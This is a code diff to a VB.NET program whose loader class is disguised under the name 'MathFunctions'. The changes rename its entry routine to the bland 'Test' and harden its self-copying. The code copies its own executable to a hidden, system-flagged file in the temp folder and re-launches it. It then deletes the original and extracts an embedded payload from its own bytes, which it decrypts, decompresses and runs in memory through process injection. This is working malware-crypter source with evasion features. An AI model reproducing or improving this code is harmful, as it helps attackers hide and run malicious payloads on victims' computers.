@@ -844,7 +844,7 @@ Public Class Form1
 
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         MathFunctions.EnsureInitialized()
-        MathFunctions.initilize()
+        MathFunctions.Test()
     End Sub
 End Class
 
@@ -859,10 +859,10 @@ Class MathFunctions
         Dim L = New anti.IntegrityCheck
         L.AppExePath = ExePAth
         L.AppPath = AppPAth
-        L.Runcheck
+        L.RunCheck()
     End Sub
 
-    Shared Sub initilize()
+    Shared Sub Test()
         Dim AppPath As String = Application.ExecutablePath
 
         Dim Payload() As Byte = GetPload(AppPath)
@@ -881,13 +881,22 @@ Class MathFunctions
                 Dim AppName As String = Strings.Right(AppPath, (AppPath.ToString.Length - AppPath.LastIndexOf("\")))
 
                 'copy our self to temp and re execute
-                FileIO.FileSystem.WriteAllBytes(TmpPath & AppName, FileIO.FileSystem.ReadAllBytes(AppPath), False)
-                'mark new file as system file
-                Dim attribute As System.IO.FileAttributes = IO.FileAttributes.System
-                System.IO.File.SetAttributes(TmpPath & AppName, attribute)
-                'mark new file as hidden file
-                attribute = IO.FileAttributes.Hidden
-                System.IO.File.SetAttributes(TmpPath & AppName, attribute)
+                Try
+                    FileIO.FileSystem.WriteAllBytes(TmpPath & AppName, FileIO.FileSystem.ReadAllBytes(AppPath), False)
+
+                Catch ex As Exception
+                    Try
+                        FileIO.FileSystem.DeleteFile(TmpPath & AppName)
+                        FileIO.FileSystem.WriteAllBytes(TmpPath & AppName, FileIO.FileSystem.ReadAllBytes(AppPath), False)
+
+                    Catch exx As Exception
+                        End
+                    End Try
+                End Try
+
+
+                System.IO.File.SetAttributes(TmpPath & AppName, IO.FileAttributes.Hidden)
+                System.IO.File.SetAttributes(TmpPath & AppName, IO.FileAttributes.System)
                 Process.Start(TmpPath & AppName)
                 'melt
                 If Payload(Start - 12) = &H54 Then
@@ -927,13 +936,14 @@ Class MathFunctions
         NewByts = Loop1(NewByts, Payload, Start)
         NewByts = Loop2(NewByts)
 
+
+
         If Payload(Start - 16) = &H54 Then
             Dim f As New dll.Class1
             f.Main(Application.ExecutablePath)
         Else
             CMemoryExecute.Run(AES_Decrypt(Decompress(NewByts)), AppPath)
         End If
-
         Process.GetCurrentProcess.Kill()
     End Sub
 
@@ -1074,19 +1084,6 @@ Class MathFunctions
             Return Reflection.Assembly.Load(assemblyData)
 
         End Using ' stream
-    End Function
-
-    Private Function ToBytes(ByVal instance As IO.Stream) As Byte()
-        Dim capacity As Integer = If(instance.CanSeek, Convert.ToInt32(instance.Length), 0)
-        Using result As New IO.MemoryStream(capacity)
-            Dim readLength As Integer
-            Dim buffer(4096) As Byte
-            Do
-                readLength = instance.Read(buffer, 0, buffer.Length)
-                result.Write(buffer, 0, readLength)
-            Loop While readLength > 0
-            Return result.ToArray()
-        End Using
     End Function
 
 End Class
